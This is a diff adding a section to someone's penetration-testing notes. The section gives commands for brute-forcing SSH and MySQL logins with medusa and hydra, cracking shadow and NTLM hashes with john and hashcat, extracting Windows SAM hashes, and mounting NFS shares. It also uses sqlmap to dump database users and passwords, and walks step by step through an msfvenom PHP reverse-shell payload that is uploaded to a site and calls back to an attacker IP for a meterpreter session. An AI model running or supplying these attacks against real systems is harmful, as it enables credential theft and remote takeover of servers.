@@ -230,6 +230,94 @@ PS Always look at auxiliary/scanner/ for enumerators in metasploit
     - where p option is for plugins (more on that after wpscan -h) 
     - sometime is good idea to add wp_content_dir (more on that in wpscan -h) 
 
+4. Command_Steps
+   Always check if passwords find in one place is valid in different systems and application for that user 
+
+    • medusa
+    - for brutforce passwords. 
+    - display all modules currently installed 
+      >medusa -d
+    - display specific options for a given module (in this example smbnt) 
+      >medusa -M smbnt -q
+    - I can try for example to hack mysql 
+      >medusa -h 192.168.1.120 -u root -p password -e ns -O mysql.medusa.out -M mysql
+    • hydra
+    - also useful and nice for that job 
+      >hydra -L /fileWithUserNames.txt -e ns 192.168.1.25 ssh
+      >hydra -L /fileWithUserNames.txt -P /PasswordsList.txt -e ns 192.168.1.25 ssh
+       -e option allows search not defined (n) and passwords same like user-name (s)
+    • john
+    - for the shadow files 
+      >john -wordlist=/path/to/file/with/passwords.txt ~/preperd/shadowFile.txt
+    - we can use configure file to create more sophisticated word list http://contest-2010.korelogic.com/rules.html
+      They can be viewed and added to in the file located at _/etc/john/john.conf under ‘#Wordlist mode rules’
+      To perform modifications according to these rules run the following command 
+      >john -wordlist=rockyou.txt -rules -stdout > rockyouslownikpo.txt
+    - shadowFile.txt without big changes, removing "empty users" and we are ready to go 
+    - john can be used without wordlist. Then I can use specific format (nt2 is for windows ntlm, lm hashes)
+      PS: I can check the format by john /root/fileWithHAsh.txt 
+      >john /root/fileWithHAsh.txt -format=nt2 -users=userName -show
+    - and I can use a brute force without a dictionary 
+      >john -incremental:lanman /root/fileWithHAsh.txt
+       lanman – Letters, numbers, and some special characters.
+       alpha – Letters only.
+       digits – Numbers only.
+       all – All possible characters.
+    - I can also store a session and back to it atelier 
+      >john -incremental:lanman /root/fileWithHAsh.txt -session=nameOfSesion
+    - restore by
+      >john -restore=nameOfSesion
+• hashcat
+    - great like john 
+      >hashcat -a 0 -m 500 hash.txt wordlist.txt
+       -a == attack mode and 0 = straight (more in man)
+       -m == hash type and 500 = md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5 (much more in man)
+    - hash.txt is modified shadow file (remove "empty users", remove users name, remove last sings (only HASH)) 
+• strings
+    - great command to pull string out of core files and many more 
+• NFS (Network File Shares)
+    - I can check if I can mount some shares in a target system (in metasploit)
+      >use auxiliary/scanner/nfs/nfsmount 
+    - After that I know if I can mount something simple like that
+      >mkdir /tmp/metasploitable
+      >mount -o nolock -t nfs 10.10.10.125:/ /tmp/metasploitable 
+       10.10.10.125:/ ==> is a "/" directory on a target "10.10.10.125"
+• VNC (Virtual Network Computing)
+    - remote access to the target. I can check if it is possible to use vnc without any credentials 
+      (like always matasploit is the best)
+      >use auxiliary/scanner/vnc/vnc_none_auth
+    - if I got credentials I may use it as well with the above exploit
+• Windows
+    - getting system and a sam file 
+    - both file contain a hashes for crack. They are located in Windows/System32/Config 
+    - Bkhive and samdump2 work together to extract Windows password hashes from the SAM and SYSTEM files. 
+    - for get system file:
+      >bkhive system /root/fileToPutHiveResults.txt 
+    - for get sam file:
+      >samdump2 SAM /root/fileToPutHiveResults.txt > /root/hash.txt 
+• sqlmap
+    - sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL 
+      injection flaws and taking over of database servers. 
+    - example show web page witch potential sql with checking if current user is administrator and check current database
+      >sqlmap -u http://192.168.1.120/products.php?id=1 --current-user --is-dba --current-db 
+    - example 2 take users names and their passwords
+      >sqlmap -u http://192.168.1.120/products.php?id=1 --users --passwords 
+• setoolkit
+    - For use of ready to go trojans 
+• msfvenom
+    - For creating your own trojans with default settings 
+    - It is fun thing. I can use it for example to create php payload. Steps to do are: 
+      1. Creating a payload
+         >msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.15 LPOTR=6000 -e php/base64 -f raw > exploit.php
+          With -f i can precise format (i could use .exe for example if i don`t whant to use php exploit).
+          The ip 10.0.2.15 is the attacker address. 
+    2. Add to exploit.php == <?php in the begining of the file and ?> to the end 
+    3. Upload that payload to the web page 
+    4. use exploit/multi/handler on msfconsole 
+    5. Set LHOST and LPOTR like in peyload (attacker ip and listening port) 
+    6. exploit 
+    7. go to the uploaded file www.lol.pl/uploadfiles/exploit.php 
+    8. That is it. I got meterpreter console on metasploit :) 
 
 
 
